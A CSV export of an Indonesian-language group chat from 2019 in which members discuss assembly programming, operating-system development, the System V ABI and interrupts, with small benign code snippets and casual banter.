+547,0,"Dia sekarang udah mati, bunuh diri matinya.",14,7,2019,14,45,16,Ammar Faizi,,0,ammarfaizi2
+548,0,Hmm,14,7,2019,14,45,26,ZakiNadhif,,0,zndf0
+549,0,Pernah liat,14,7,2019,14,45,49,ZakiNadhif,,0,zndf0
+550,0,Menarik ceritanya.,14,7,2019,14,45,54,Ammar Faizi,,0,ammarfaizi2
+551,0,Assembly emang bikin gila guys.,14,7,2019,14,46,15,,,0,
+552,0,Wkwk,14,7,2019,14,46,20,ZakiNadhif,,0,zndf0
+553,0,,14,7,2019,14,46,39,,,0,
+554,0,:'v,14,7,2019,14,46,51,ZakiNadhif,,0,zndf0
+555,546,Gk mau gitu wkwk,14,7,2019,14,47,13,ZakiNadhif,,0,zndf0
+556,0,Bukannya kalo bikin OS sendiri bisa dapet direct access ke hardware yak?,14,7,2019,14,47,57,ZakiNadhif,,0,zndf0
+557,0,"Seru aja, mau coba wkwk",14,7,2019,14,48,17,ZakiNadhif,,0,zndf0
+558,556,Btw tanya nih,14,7,2019,14,48,28,ZakiNadhif,,0,zndf0
+559,556,"OS ngehandle kernel, kernel handle processor, baru hardware bisa dicontrol.",14,7,2019,14,49,11,,,0,
+560,0,Iya,14,7,2019,14,49,36,ZakiNadhif,,0,zndf0
+561,0,Hmm,14,7,2019,14,50,10,ZakiNadhif,,0,zndf0
+562,559,Udah pernah coba bikin?,14,7,2019,14,50,52,ZakiNadhif,,0,zndf0
+563,562,Belum,14,7,2019,14,51,32,,,0,
+564,0,"Hmm, coba matiin fan, abis itu compute raytracing",14,7,2019,14,52,28,ZakiNadhif,,0,zndf0
+565,0,Auto leleh,14,7,2019,14,52,42,ZakiNadhif,,0,zndf0
+566,0,Emang bisa?,14,7,2019,14,52,50,ZakiNadhif,,0,zndf0
+567,0,Overheat biasanya langsung mati.,14,7,2019,14,53,11,,,0,
+568,0,Iya juga sih,14,7,2019,14,53,20,ZakiNadhif,,0,zndf0
+569,0,Bisa aja matiin fan,14,7,2019,14,53,44,,,0,
+570,0,Ok,14,7,2019,14,53,55,ZakiNadhif,,0,zndf0
+571,0,https://pastebin.com/raw/MtswwMSB,14,7,2019,14,54,44,Ammar Faizi,,0,ammarfaizi2
+572,0,I think it isn't true,14,7,2019,14,56,11,ZakiNadhif,,0,zndf0
+573,0,Even if it is,14,7,2019,14,56,18,ZakiNadhif,,0,zndf0
+575,0,Jadi buronan dia.,14,7,2019,14,59,31,Ammar Faizi,,0,ammarfaizi2
+576,0,Hmm,14,7,2019,14,59,43,ZakiNadhif,,0,zndf0
+577,0,Video-videonya masih beredar di internet.,14,7,2019,14,59,43,Ammar Faizi,,0,ammarfaizi2
+578,0,Bagus sih videonya. Saya pernah nonton videonya pas nunjukin C REPL bikinan dia.,14,7,2019,15,0,49,Ammar Faizi,,0,ammarfaizi2
+579,0,Hmm,14,7,2019,15,0,57,ZakiNadhif,,0,zndf0
+580,0,Ada assembler juga.,14,7,2019,15,0,58,Ammar Faizi,,0,ammarfaizi2
+581,0,Tapi,14,7,2019,15,1,0,ZakiNadhif,,0,zndf0
+582,0,Btw itu dapet pdf yg dari sekolah gitu nyarinya dimana,14,7,2019,15,2,15,ZakiNadhif,,0,zndf0
+583,0,Pengen tau min,14,7,2019,15,2,22,ZakiNadhif,,0,zndf0
+584,0,Saya dapet link dari grup internal sih << :3\nNyari di google kemungkinan banyak.,14,7,2019,15,3,14,Ammar Faizi,,0,ammarfaizi2
+585,546,Jangan percaya gituan ah wkwk,14,7,2019,15,3,24,ZakiNadhif,,0,zndf0
+586,584,Oh ok,14,7,2019,15,3,30,ZakiNadhif,,0,zndf0
+587,585,Kyknya orangnya stress doang,14,7,2019,15,3,45,ZakiNadhif,,0,zndf0
+588,585,Aku sih nggak percaya sama hal religiusnya.,14,7,2019,15,4,38,Ammar Faizi,,0,ammarfaizi2
+589,0,Cuma menarik aja ceritanya.,14,7,2019,15,4,43,Ammar Faizi,,0,ammarfaizi2
+591,0,Ok,14,7,2019,15,5,22,ZakiNadhif,,0,zndf0
+592,0,https://www.templeos.org/,14,7,2019,15,5,27,Ammar Faizi,,0,ammarfaizi2
+593,0,^ Webnya masih aktif.,14,7,2019,15,5,39,Ammar Faizi,,0,ammarfaizi2
+594,0,Coba di whois,14,7,2019,15,5,42,ZakiNadhif,,0,zndf0
+595,594,Domain dari HOSTGATOR,14,7,2019,15,6,15,Ammar Faizi,,0,ammarfaizi2
+596,0,Di whois outputnya ada kontak orangnya?,14,7,2019,15,7,13,ZakiNadhif,,0,zndf0
+597,0,"Nggak ada, pakai whois protection kayanya.",14,7,2019,15,7,48,Ammar Faizi,,0,ammarfaizi2
+598,0,Ohh,14,7,2019,15,7,55,ZakiNadhif,,0,zndf0
+599,584,"Pake google dorking juga bisa, tapi kualitasnya jangan tanya saia",14,7,2019,15,8,54,ZakiNadhif,,0,zndf0
+600,0,Nonton yutub yok,14,7,2019,15,9,22,ZakiNadhif,,0,zndf0
+601,0,Nonton Terry Davis?,14,7,2019,15,9,35,Ammar Faizi,,0,ammarfaizi2
+602,0,Gk,14,7,2019,15,9,51,ZakiNadhif,,0,zndf0
+603,0,Gk mau wkwk,14,7,2019,15,9,55,ZakiNadhif,,0,zndf0
+604,0,"Udah malem btw, gk tidur?",14,7,2019,15,10,22,ZakiNadhif,,0,zndf0
+605,0,Besok nggak kerja,14,7,2019,15,10,55,Ammar Faizi,,0,ammarfaizi2
+606,0,"Besok sekolah, sedih",14,7,2019,15,11,10,ZakiNadhif,,0,zndf0
+607,0,Bobok aja,14,7,2019,15,11,50,Ammar Faizi,,0,ammarfaizi2
+608,0,"Iya bobok, bangun pagi",14,7,2019,15,12,10,ZakiNadhif,,0,zndf0
+609,0,Sip,14,7,2019,15,12,12,ZakiNadhif,,0,zndf0
+610,0,Bye om,14,7,2019,15,12,22,ZakiNadhif,,0,zndf0
+611,0,*mas,14,7,2019,15,12,30,ZakiNadhif,,0,zndf0
+612,0,,14,7,2019,16,35,31,Selvia,,0,Selviayuditya
+613,0,,15,7,2019,1,41,47,,,0,
+614,0,System Initialization (x86) - OSDev Wiki\nhttps://wiki.osdev.org/System_Initialization_(x86),15,7,2019,4,8,22,ZakiNadhif,,0,zndf0
+623,616,"Hmm, ajarin",15,7,2019,5,3,5,ZakiNadhif,,0,zndf0
+625,0,Hehe,15,7,2019,5,5,27,ZakiNadhif,,0,zndf0
+626,0,Gpp,15,7,2019,5,5,29,ZakiNadhif,,0,zndf0
+627,621,Iya tapi kok bahasa nya gini ya wkwk,15,7,2019,5,6,28,ZakiNadhif,,0,zndf0
+628,551,Gila dan genius itu beda tipis,15,7,2019,5,51,56,詹,鉦華,0,jzh4n
+629,616,mungkin bukan compiler tapi cara kerja task switching sama memory banking?,15,7,2019,7,16,44,Suka,Isnaini,0,kenzanin
+630,0,https://littleosbook.github.io\nebook bikin os.\niya kayaknya memang harus mendalami compiler (gcc) karena author nya pakai mix c dan asm.,15,7,2019,8,16,18,Suka,Isnaini,0,kenzanin
+631,0,,15,7,2019,8,16,26,Suka,Isnaini,0,kenzanin
+634,0,,15,7,2019,9,41,4,Adii,Jee,6281329383106,Adijee
+635,0,Halo salam kenal gan.. ijin gabung dimari,15,7,2019,9,41,35,Adii,Jee,6281329383106,Adijee
+636,0,"Assembly ane taunya dulu pertama kali waktu itu ada programmer antivirus asal indonesia nama antivirusnya ANSAV klo gak salah, ada yang tau?",15,7,2019,9,43,26,Adii,Jee,6281329383106,Adijee
+637,0,"dlu pernah liat sc nya disharing sama si dev ANSAV dan sampe ane slesai kuliah di IT cuma tau basic banget istilah assembly ada register, nor, dll.. 😄🙏",15,7,2019,9,44,33,Adii,Jee,6281329383106,Adijee
+638,0,https://github.com/anvie/ansav32-asm,15,7,2019,9,49,50,Adii,Jee,6281329383106,Adijee
+641,0,😄😄yoi gan.. Indonesia kaya dengan orang yg creative dan inovatif,15,7,2019,9,55,5,Adii,Jee,6281329383106,Adijee
+642,0,😎😎👍,15,7,2019,9,55,10,Adii,Jee,6281329383106,Adijee
+643,0,"sekedar nanya gan, apakah Assembly sbg bahasa programing banyak diminati corporate jaman sekarang?",15,7,2019,9,55,49,Adii,Jee,6281329383106,Adijee
+645,0,"soalnya klau industri IT stau ane skrg banyak yg cari klow gk dev web,mobile.",15,7,2019,9,56,27,Adii,Jee,6281329383106,Adijee
+647,644,"btul bgt ni,, asm ni lanjutan dari orkom kalo diane gan, soalnya bahasannya udah ke prosesor n memory cmiiw 😁👍",15,7,2019,9,56,56,Adii,Jee,6281329383106,Adijee
+649,0,dan itu jarang yg ngulik soalnya langsung kepeminatan alias penjurusan kuliah ky web/mobile he,15,7,2019,9,57,24,Adii,Jee,6281329383106,Adijee
+652,0,bnyak nya di industri security sama hardware gt ya gan klow assembly,15,7,2019,9,59,55,Adii,Jee,6281329383106,Adijee
+654,651,waah ini khatam nya brapa lama yak klow blajar sndiri 😄,15,7,2019,10,0,18,Adii,Jee,6281329383106,Adijee
+656,0,wahh abstrak 😃😃,15,7,2019,10,3,9,Adii,Jee,6281329383106,Adijee
+657,0,"ane aja klow disuruh bkin kelas abstrak di C++ ngak mudeng"" smpe skrg gan.. gmn di asm😂😂",15,7,2019,10,4,11,Adii,Jee,6281329383106,Adijee
+658,0,"dulu pernah ngikut"" forum sec indo, banyak yg bisa assembly suhu"" forum hhe",15,7,2019,10,4,57,Adii,Jee,6281329383106,Adijee
+659,0,mrk mahir bgt bkin tools pke asm,15,7,2019,10,5,19,Adii,Jee,6281329383106,Adijee
+660,0,"smpe skrg bingung, mrk blajar dri mana 😄 kyanya memang giat ngulik dan basic logic ny kuat he",15,7,2019,10,5,51,Adii,Jee,6281329383106,Adijee
+661,655,"susah indonesia mah, SSL aja harus nambah sendiri, gak by default ada",15,7,2019,10,12,21,F,,0,fdedraco
+662,630,Makasih hehe,15,7,2019,10,12,33,ZakiNadhif,,0,zndf0
+663,632,Memory banking apaan? Kaya memori management?,15,7,2019,10,14,11,ZakiNadhif,,0,zndf0
+665,0,Oo,15,7,2019,10,25,50,ZakiNadhif,,0,zndf0
+668,0,,15,7,2019,10,26,31,Moriah,Soewako,0,soewako
+669,0,Lagi pada bahas apa nih?,15,7,2019,10,26,41,Moriah,Soewako,0,soewako
+670,0,OS,15,7,2019,10,27,14,ZakiNadhif,,0,zndf0
+671,0,🤔... Sama belajar asm,15,7,2019,10,27,37,ZakiNadhif,,0,zndf0
+672,0,:),15,7,2019,10,27,39,ZakiNadhif,,0,zndf0
+673,0,OS? Pada punya proyek OS nih jadi?,15,7,2019,10,28,39,Moriah,Soewako,0,soewako
+674,0,Pengen sih,15,7,2019,10,28,51,ZakiNadhif,,0,zndf0
+675,0,Bisa gk?,15,7,2019,10,28,53,ZakiNadhif,,0,zndf0
+676,0,@YostaMissUuu jadi dev-ing compiler gmana?,15,7,2019,10,29,39,ZakiNadhif,,0,zndf0
+677,0,Rumit gk?,15,7,2019,10,30,19,ZakiNadhif,,0,zndf0
+679,0,Oo,15,7,2019,10,30,41,ZakiNadhif,,0,zndf0
+680,0,Hebad,15,7,2019,10,30,42,ZakiNadhif,,0,zndf0
+682,0,Iya wkwk,15,7,2019,10,31,9,ZakiNadhif,,0,zndf0
+683,678,Pernah dapet zero day exploit?,15,7,2019,10,32,41,ZakiNadhif,,0,zndf0
+684,638,"Pakai winapi, IDE pakai Radasm v2... 🤔",15,7,2019,10,37,3,Ery E.,Wahyutama,0,e_Wahyutama
+686,678,wah sangar jg profesi ente om.. 😊 ijin berguru dong om..,15,7,2019,10,49,40,Adii,Jee,6281329383106,Adijee
+687,632,c(ndak tahu klo compiler lain hla mungkin bisa hehe) ndak sampai ke situ. sampai sekarang kernel linux untuk memory management pun masih assembly.\ncmiiw.,15,7,2019,10,50,58,Suka,Isnaini,0,kenzanin
+688,0,"di ebook diatas juga masih assembly, cuman karena dicompile nya pakai gcc jadi ngikut aturan gcc. mungkin klo compile nya pakai nasm ikut aturan nasm? (belum pernah mix antara gcc sama nasm hehe)",15,7,2019,10,53,14,Suka,Isnaini,0,kenzanin
+689,632,Hmm.. memory management bukannya dikernelnya ya?,15,7,2019,11,17,56,ZakiNadhif,,0,zndf0
+690,0,Oiya,15,7,2019,11,19,42,ZakiNadhif,,0,zndf0
+691,0,Gagal paham sorry,15,7,2019,11,20,12,ZakiNadhif,,0,zndf0
+692,0,Lupakan,15,7,2019,11,20,24,ZakiNadhif,,0,zndf0
+694,0,Siap,15,7,2019,11,29,1,ZakiNadhif,,0,zndf0
+695,0,Biasanya @ammarfaizi2 suka kasih kuis-kuis assembly nih 👀,15,7,2019,15,5,4,Moriah,Soewako,0,soewako
+696,695,Ntar kalau longgar ku kasih deh.,15,7,2019,21,53,7,Ammar Faizi,,0,ammarfaizi2
+697,696,Ga sekalian bikin kulgram om ngadimin?,15,7,2019,23,42,8,詹,鉦華,0,jzh4n
+698,697,Belum ada waktu,16,7,2019,8,52,36,Ammar Faizi,,0,ammarfaizi2
+699,0,Ada yang tau ACPI buat apa?,16,7,2019,11,42,12,ZakiNadhif,,0,zndf0
+700,0,,16,7,2019,12,24,45,Richer,Wicaksono,0,wicaksonohgunners
+701,0,#ask cara programming arduino board pake assembly gimana yah?,16,7,2019,12,32,38,ZakiNadhif,,0,zndf0
+702,701,"pakai file .s atau pakai asm(""nop""). cuman klo pakai .s caranya gimana ya? default nya ide ino gitu dia. \nklo di compile di luar ide bisa saja.",16,7,2019,12,43,26,Suka,Isnaini,0,kenzanin
+703,0,Makasih,16,7,2019,12,44,41,ZakiNadhif,,0,zndf0
+704,699,umumnya buat monitoring hardware terkait batt temperature dll. dulu masing2 vendor punya cara sendiri2 lama2 dijadikan satu metode. kecuali thinkpad masih pakai cara aneh hehe,16,7,2019,12,45,6,Suka,Isnaini,0,kenzanin
+705,703,same2,16,7,2019,12,45,22,Suka,Isnaini,0,kenzanin
+706,704,Ok ok,16,7,2019,12,46,24,ZakiNadhif,,0,zndf0
+707,0,,17,7,2019,0,5,17,Haidar Fadhil Aryasuta,,0,kurniawardana
+708,0,Welcome,17,7,2019,1,47,38,ZakiNadhif,,0,zndf0
+709,0,Identation di kode asm setelah instruksi bagusnya berapa?,17,7,2019,7,23,36,ZakiNadhif,,0,zndf0
+711,0,1 tab = 4 spaces,17,7,2019,7,24,8,ZakiNadhif,,0,zndf0
+712,0,Aku biasanya ratain sih,17,7,2019,8,3,1,Moriah,Soewako,0,soewako
+713,0,Satu fungsi indentasinya sama semua,17,7,2019,8,3,8,Moriah,Soewako,0,soewako
+714,0,Oh makasih,17,7,2019,8,3,28,ZakiNadhif,,0,zndf0
+715,0,Tapi kalo fungsinya panjang gimana?,17,7,2019,8,3,39,ZakiNadhif,,0,zndf0
+716,0,Ya sama,17,7,2019,8,3,45,Moriah,Soewako,0,soewako
+717,0,Ok,17,7,2019,8,4,7,ZakiNadhif,,0,zndf0
+718,0,"```func1:\n lw   %r3, 0(%r0)\n add  %r3, %r3, %r3\n mr   %r4, %r0\n ; ...\n addi %r0, %r4, 4\n blr  ; akhir fungsi\n\n\nfunc2:\n mr  %r4, %r3\n blr ; akhir fungsi```",17,7,2019,8,6,34,Moriah,Soewako,0,soewako
+719,0,Kaya gini lah kira-kira,17,7,2019,8,7,2,Moriah,Soewako,0,soewako
+720,0,"Kalau masih satu fungsi, sejajar semua",17,7,2019,8,7,14,Moriah,Soewako,0,soewako
+721,0,Ooh,17,7,2019,8,7,45,ZakiNadhif,,0,zndf0
+722,0,Ok ok makasih,17,7,2019,8,8,8,ZakiNadhif,,0,zndf0
+723,0,Link selingan,17,7,2019,9,16,43,Ammar Faizi,,0,ammarfaizi2
+724,0,"@ammarfaizi2 a quick, and dense video about basic of CPU, https://youtu.be/sK-49uz3lGg",17,7,2019,9,16,43,Ammar Faizi,,0,ammarfaizi2
+725,0,,18,7,2019,5,41,57,FASTABIQULL,KHOIROTT,0,BooleanZ
+726,724,http://www.lighterra.com/papers/modernmicroprocessors/ 👀,18,7,2019,6,16,7,Moriah,Soewako,0,soewako
+727,0,Makasih,18,7,2019,7,5,58,ZakiNadhif,,0,zndf0
+728,0,,19,7,2019,1,19,6,,,0,
+729,0,Welcome,19,7,2019,2,8,25,ZakiNadhif,,0,zndf0
+730,0,,19,7,2019,4,53,26,,,0,
+731,0,,19,7,2019,16,49,25,🇷🇺 Katrovisch,,0,Katrovisch
+732,0,,21,7,2019,8,5,56,Rheza,Dio Pratama,0,rprata1
+733,0,,21,7,2019,15,48,50,Apri,Junaidi,0,aprijunaidi
+734,0,,22,7,2019,6,20,27,Ki,Soewarsono,0,soewarsono
+735,0,,22,7,2019,8,47,14,Zen,,0,kosongblong
+736,0,,22,7,2019,10,58,9,Firdaus,Setiawan,0,
+737,0,mau tanya kalau menjalankan program asembler di linux compilernya apa  ya..,22,7,2019,12,49,36,Arief,Banyubiru,0,ariefBanyubiru
+738,737,Pakai gcc aja bisa kok,22,7,2019,12,54,27,Moriah,Soewako,0,soewako
+739,0,"Nasm, gas, masm",22,7,2019,12,54,27,ZakiNadhif,,0,zndf0
+740,0,Oiya juga om,22,7,2019,12,54,35,ZakiNadhif,,0,zndf0
+741,739,masm bukannya khusus Windows ya?,22,7,2019,13,6,53,詹,鉦華,0,jzh4n
+742,0,Oh gk tau mas,22,7,2019,13,7,48,ZakiNadhif,,0,zndf0
+743,0,Sorry,22,7,2019,13,7,50,ZakiNadhif,,0,zndf0
+744,0,:'),22,7,2019,13,7,55,ZakiNadhif,,0,zndf0
+745,0,setau saya dlu kalau kalau windows borlan asembler,22,7,2019,13,32,54,Arief,Banyubiru,0,ariefBanyubiru
+746,745,Tahun kapan ini bang 🤔?,22,7,2019,14,3,51,Maaf,Merepotkan... 🙏,0,cahgentoo
+747,0,Maksud saya TASM . turbo aslembler yg dikembangkan oleh  borland,23,7,2019,0,14,1,Arief,Banyubiru,0,ariefBanyubiru
+748,0,sktr tahun 2004,23,7,2019,0,14,47,Arief,Banyubiru,0,ariefBanyubiru
+749,0,https://github.com/zamronypj/oprsimd vector operation memanfaatkan intel SSE,23,7,2019,0,27,4,Zamrony P.,Juhara,0,zamronypj
+750,0,,23,7,2019,2,19,32,Shendy,,0,Shendyva
+751,749,Ini kalau di x86 kembaliannya mesti dipecah antara xmm0/xmm1 ya? 🤔,23,7,2019,2,27,50,Moriah,Soewako,0,soewako
+752,0,itu requirement System V ABI di Linux yang dipatuhi FreePascal.  https://refspecs.linuxfoundation.org/elf/x86_64-abi-0.95.pdf,23,7,2019,4,3,11,Zamrony P.,Juhara,0,zamronypj
+753,752,Hmmm menarik,23,7,2019,4,30,13,Moriah,Soewako,0,soewako
+754,0,"Ini aku coba kompile kode C begini:\n```#include <immintrin.h>\n\n__m128 vec_add(__m128 a, __m128 b) {\n return _mm_add_ps(a, b);\n}```Jadinya begini:\n```0000000000000000 <vec_add>:\n   0: 0f 58 c1              addps  %xmm1,%xmm0\n   3: c3                    retq```",23,7,2019,4,30,53,Moriah,Soewako,0,soewako
+755,0,Freepascal sayangnya gak punya sse intrinsic function,23,7,2019,4,32,9,Zamrony P.,Juhara,0,zamronypj
+756,0,Dia langsung return semuanya di xmm0,23,7,2019,4,32,13,Moriah,Soewako,0,soewako
+757,0,Gak dipecah,23,7,2019,4,32,24,Moriah,Soewako,0,soewako
+758,0,ABI menysyaratkan struct lebih dari 64bit dipass di low quadword xmm0 dan xmm1,23,7,2019,4,33,39,Zamrony P.,Juhara,0,zamronypj
+759,0,Oh,23,7,2019,4,34,14,Moriah,Soewako,0,soewako
+760,0,TVector ini struct biasa ya?,23,7,2019,4,34,21,Moriah,Soewako,0,soewako
+761,0,Karena yang direturn fungsi tadi adalah struct jadinya kayak gitu,23,7,2019,4,34,28,Zamrony P.,Juhara,0,zamronypj
+762,0,Okee okee,23,7,2019,4,34,32,Moriah,Soewako,0,soewako
+763,0,,23,7,2019,6,27,43,Bayu,,0,napstermaid
+764,0,Om mau nanya nih cara jalani code asm 32 bit di os 64bit gimana ya,23,7,2019,6,28,7,Bayu,,0,napstermaid
+765,763,int 80h buat apa om?,23,7,2019,7,52,21,詹,鉦華,0,jzh4n
+766,0,Fungsi syscall om,23,7,2019,7,54,29,Bayu,,0,napstermaid
+767,0,https://www.instagram.com/p/B0QFN1jBM7o/?igshid=1eq729m11volb,23,7,2019,8,50,24,Paulus,Siahaan,0,
+768,0,,23,7,2019,10,28,20,$_ Alan,,0,AlGhuroba1996
+769,763,kayaknya sih gara gara \n\npop eax\npop eax\npop eax\n\nItu tujuannya?,23,7,2019,12,51,5,Zamrony P.,Juhara,0,zamronypj
+770,769,Kayaknya itu mau ambil argv.,23,7,2019,12,54,46,Ammar Faizi,,0,ammarfaizi2
+771,0,./appname argv[1] argv[2] ...,23,7,2019,12,55,23,Ammar Faizi,,0,ammarfaizi2
+772,0,pop eax ; argc\npop eax ; argv[0]\npop eax ; argv[1],23,7,2019,12,56,47,Ammar Faizi,,0,ammarfaizi2
+773,0,Misal jalanin\n\n```./appname 5```,23,7,2019,12,57,11,Ammar Faizi,,0,ammarfaizi2
+774,0,Berarti char '5' - 0x30 jadi int 5,23,7,2019,12,57,35,Ammar Faizi,,0,ammarfaizi2
+775,0,Trus loop 5 kali,23,7,2019,12,57,46,Ammar Faizi,,0,ammarfaizi2
+776,0,Kayaknya gitu sih,23,7,2019,12,57,50,Ammar Faizi,,0,ammarfaizi2
+777,737,Nyimak,23,7,2019,12,57,56,Firdaus,Setiawan,0,
+778,774,Ya om bisa,23,7,2019,12,59,2,Bayu,,0,napstermaid
+779,0,Maklum baru belajar om,23,7,2019,12,59,12,Bayu,,0,napstermaid
+780,0,,23,7,2019,13,16,3,Kang,Galau,0,Memilihtakberartimenikahbesok
+781,772,"argc argv dipush ke stack, ketika di pop eax, secara tidak langsung, register esp akan berubah. Stack pointernya jadi kacau, ketika misal dibawah ada instruksi leave\n\nKalau tujuannya ambil argc mending\n\npush ebp\nmov ebp, esp\nmov eax, dword[ebp+4]\n...\nSebelum keluar, restore stack pointernya\n\n....\nmov esp, ebp\npop ebp",23,7,2019,13,36,4,Zamrony P.,Juhara,0,zamronypj
+782,781,Epilog bisa pakai ebp 😆,23,7,2019,13,44,34,Ammar Faizi,,0,ammarfaizi2
+783,0,Nah,23,7,2019,13,44,59,Ammar Faizi,,0,ammarfaizi2
+784,0,Anyway,23,7,2019,13,45,54,Ammar Faizi,,0,ammarfaizi2
+785,0,Subroutine _start biasanya nggak return sih,23,7,2019,13,46,7,Ammar Faizi,,0,ammarfaizi2
+786,0,Syscall exit biasanya,23,7,2019,13,46,14,Ammar Faizi,,0,ammarfaizi2
+787,0,,23,7,2019,14,13,46,Mr.,FatMan,0,
+788,0,RISC-V from scratch 3: Writing a UART driver in assembly (1 / 3)\nhttps://twilco.github.io/riscv-from-scratch/2019/07/08/riscv-from-scratch-3.html,24,7,2019,7,31,59,Ammar Faizi,,0,ammarfaizi2
+789,0,,24,7,2019,11,46,38,Hafid,Ahmad,0,hafidahmadd
+790,0,,25,7,2019,4,31,22,setyo adi,,0,setyoan
+791,0,"selamat siang, ijin bergabung",25,7,2019,4,31,59,setyo adi,,0,setyoan
+792,0,,26,7,2019,13,54,5,MAURYA,MOHIT,0,
+793,0,,27,7,2019,12,6,48,Arif,Pambudi,0,arifpambudi242
+794,0,,28,7,2019,2,53,24,v,rs,0,RTS_TX8
+795,0,,28,7,2019,23,18,13,Fauzi,,0,fauziiadhim
+796,0,Selamat pagi. Ijin gabung,28,7,2019,23,18,47,Fauzi,,0,fauziiadhim
+797,0,,28,7,2019,23,18,58,Ahmad Faris Fachrurrobbi,Silmy,0,ahmadfarisfs
+798,0,Ada yg punya panduan belajar assembly utk pemula,28,7,2019,23,19,8,Fauzi,,0,fauziiadhim
+799,798,Baca pinned message bro,28,7,2019,23,23,10,詹,鉦華,0,jzh4n
+800,0,Makasih bro,28,7,2019,23,24,37,Fauzi,,0,fauziiadhim
+801,0,,3,8,2019,9,57,3,Danny,,0,dannycreations
+802,0,untuk grup arsitektur ARM sebelah mana ya gan?,3,8,2019,9,58,13,Danny,,0,dannycreations
+803,802,Di sini kan bisa bahas ARM juga,3,8,2019,10,25,52,,,0,
+804,803,oke,3,8,2019,10,27,20,Danny,,0,dannycreations
+805,0,,3,8,2019,18,45,46,iing,,0,iingLK
+806,0,"Mohon maaf abang² mba², edisi bantu sodara klo sempet minta tolong bantu subscribe 😊🙏",5,8,2019,12,27,32,,,0,
+807,0,,6,8,2019,4,37,4,Alexander,C,0,rednaxela_c
+808,0,,6,8,2019,17,8,17,,,0,
+809,0,,7,8,2019,1,16,16,Rizky,Faza,0,mrfzy
+810,0,,7,8,2019,22,19,59,,,0,
+812,0,Ada yang bisa jelasin tentang interrupt gk?,8,8,2019,14,6,49,ZakiNadhif,,0,zndf0
+813,0,Minta tolong dong hehe,8,8,2019,14,7,1,ZakiNadhif,,0,zndf0
+814,0,Kalo ada yg punya example program interrupt juga monggo,8,8,2019,14,7,15,ZakiNadhif,,0,zndf0
+815,812,SIGINT maksudnya?,8,8,2019,14,7,31,,,0,
+816,0,Interrupt,8,8,2019,14,7,44,ZakiNadhif,,0,zndf0
+817,0,Hmm,8,8,2019,14,7,46,ZakiNadhif,,0,zndf0
+818,0,Iya,8,8,2019,14,8,7,ZakiNadhif,,0,zndf0
+819,0,setahu sy interrupt di beda arsitektur agak beda dikit implementasinya...mau untuk arsiterktur apa?,9,8,2019,7,46,52,Aswad,,0,aswadsun
+820,812,interrupt sama kayak namanya bedanya yg di interupt bukan narasumber tapi jalan nya pc (pogram counter). ketika int occurred pc akan di force untuk menuju ke alamat yg udah ditentukan. nah itu masing2 arch punya cara sendiri2 entah langsung di jalankan atau di tampung dulu di irq. cmiiw,9,8,2019,8,7,16,Suka,Isnaini,0,kenzanin
+821,0,,10,8,2019,5,35,12,,,0,
+822,0,,11,8,2019,7,38,46,,,0,
+823,0,,12,8,2019,7,30,24,Ali Tarmuji,,0,alitarmuji
+824,0,,12,8,2019,10,26,49,IT,Consulting,0,ithrd
+825,0,,13,8,2019,4,31,17,Hadi Hidayat (Robi),Hammurabi,0,hadihammurabi
+826,825,ketemu lagi,13,8,2019,4,32,9,Bryan,Wahyu,0,bryanwahyukp
+827,0,apakah kita jodoh ?,13,8,2019,4,32,27,Bryan,Wahyu,0,bryanwahyukp
+828,827,"Jodoh, tapi bukan untuk membangun rumah tangga ya",13,8,2019,4,34,22,Hadi Hidayat (Robi),Hammurabi,0,hadihammurabi
+830,0,,15,8,2019,1,27,36,Alif,Bintoro,0,alifbint
+831,828,jadi sekedar pelampiasan napsu belaka?,15,8,2019,3,55,52,Suka,Isnaini,0,kenzanin
+832,831,Ahhh mending saya cari yang wanita saja,15,8,2019,3,56,51,Hadi Hidayat (Robi),Hammurabi,0,hadihammurabi
+833,0,"hehehe tambah mantrap, selera kita sama pak. apakah kita jodoh?",15,8,2019,3,57,15,Suka,Isnaini,0,kenzanin
+834,833,"Kalau gitu boleh pak, pasokan wanitanya berikan ke saya",15,8,2019,4,3,55,Hadi Hidayat (Robi),Hammurabi,0,hadihammurabi
+835,0,hahaha buat saya saja kurang 3 lagi hehehehe,15,8,2019,4,4,23,Suka,Isnaini,0,kenzanin
+836,0,* saya tak akan terpancing godaan para homo 😂,15,8,2019,4,4,25,Hadi Hidayat (Robi),Hammurabi,0,hadihammurabi
+837,0,hehehehe,15,8,2019,4,7,56,Suka,Isnaini,0,kenzanin
+838,835,Wah banyak kesamaan kita ternyata,15,8,2019,4,9,2,Hadi Hidayat (Robi),Hammurabi,0,hadihammurabi
+839,838,yups hehehe,15,8,2019,4,9,29,Suka,Isnaini,0,kenzanin
+840,839,"Wahahaha mau diskusi tentang assembly, tapi lagi gak di depan lepi ni. Wadaw",15,8,2019,4,10,14,Hadi Hidayat (Robi),Hammurabi,0,hadihammurabi
+841,840,nyantai saja lagian group ini ndak seramai group yang lain hehehe. jadi ndak usah takut ketinggalan chat hehehe,15,8,2019,4,12,7,Suka,Isnaini,0,kenzanin
+842,841,"Ahiya, Pak. Lagi pula siapa yang mau gunakan assembly untuk real project? Apalagi seperti saya, banya web developer",15,8,2019,4,13,33,Hadi Hidayat (Robi),Hammurabi,0,hadihammurabi
+843,842,untuk embedded masih pakai minimal untuk tahu hasil optimalisasi dari compiler. juga waktu bikin driver hehehe,15,8,2019,4,17,22,Suka,Isnaini,0,kenzanin
+844,843,Penggunaan khusus ya berarti?,15,8,2019,4,18,28,Hadi Hidayat (Robi),Hammurabi,0,hadihammurabi
+845,844,iya learning curve nya asemby sangat panjang plus juga arch dan package spesific. wajar klo yng pakai cuma orang2 tertentu hehehe,15,8,2019,4,36,25,Suka,Isnaini,0,kenzanin
+846,845,64 bit sama 32 bit aja udah ngaruh banget,15,8,2019,4,37,30,Hadi Hidayat (Robi),Hammurabi,0,hadihammurabi
+847,846,"aku belum pernah nyoba asembly 64b tapi dari forum emulator game mereka lebih memilih rewrite part asembly ke c dari pada convert asm 32 ke 64, jadi aku simpulkan memang sangat beda hehehe",15,8,2019,4,38,35,Suka,Isnaini,0,kenzanin
+848,847,"Iya, Pak. Panjang register terutama, paling terlihat bedanya",15,8,2019,4,39,14,Hadi Hidayat (Robi),Hammurabi,0,hadihammurabi
+849,0,Iya kan?,15,8,2019,4,39,16,Hadi Hidayat (Robi),Hammurabi,0,hadihammurabi
+850,0,😂,15,8,2019,4,39,19,Hadi Hidayat (Robi),Hammurabi,0,hadihammurabi
+851,0,yups pastinya hehehe,15,8,2019,4,39,25,Suka,Isnaini,0,kenzanin
+852,0,"Embedded masih banyak yang pakai sih, terutama yg 8bit, limited ROM dan RAM, jadi assembly masih pilihan utama...",15,8,2019,5,32,33,Aswad,,0,aswadsun
